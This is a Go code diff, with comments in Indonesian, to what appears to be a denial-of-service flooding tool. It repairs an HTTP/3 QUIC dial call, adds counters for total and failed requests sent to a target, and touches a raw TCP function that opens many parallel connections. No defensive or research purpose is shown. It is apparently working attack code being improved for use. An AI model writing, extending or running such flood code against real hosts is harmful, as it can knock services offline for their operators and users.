@@ -469,19 +469,20 @@ func customHTTP2Frame(target string, host string, path string) {
         EndStream:     true,
     })
 }
-
+// http3
 func customHTTP3(target, path string) {
     roundTripper := &http3.RoundTripper{
         EnableDatagrams: true,
         Dial: func(ctx context.Context, addr string, tlsCfg *tls.Config, cfg *quic.Config) (quic.EarlyConnection, error) {
-            return quic.DialAddrEarly(addr, tlsCfg, cfg)
+            // Tambahkan context sebagai argumen pertama
+            return quic.DialAddrEarly(ctx, addr, tlsCfg, cfg)
         },
     }
     defer roundTripper.Close()
 
     client := &http.Client{
         Transport: roundTripper,
-        Timeout:   30 * time.Second,  // Ditingkatkan timeout
+        Timeout:   30 * time.Second,
     }
 
     headers := []struct {
@@ -503,6 +504,7 @@ func customHTTP3(target, path string) {
             
             req, err := http.NewRequest("GET", "https://"+target+path, nil)
             if err != nil {
+                atomic.AddInt64(&fail, 1)
                 return
             }
 
@@ -511,6 +513,8 @@ func customHTTP3(target, path string) {
             }
 
             resp, err := client.Do(req)
+            atomic.AddInt64(&total, 1)
+            
             if err == nil && resp != nil {
                 io.Copy(io.Discard, resp.Body)
                 resp.Body.Close()
@@ -523,7 +527,7 @@ func customHTTP3(target, path string) {
     wg.Wait()
 }
 
-// -- RAW TCP/UDP --
+// tcp
 func rawTCP(target string, host string, path string) {
     // Buat multiple koneksi parallel
     var wg sync.WaitGroup
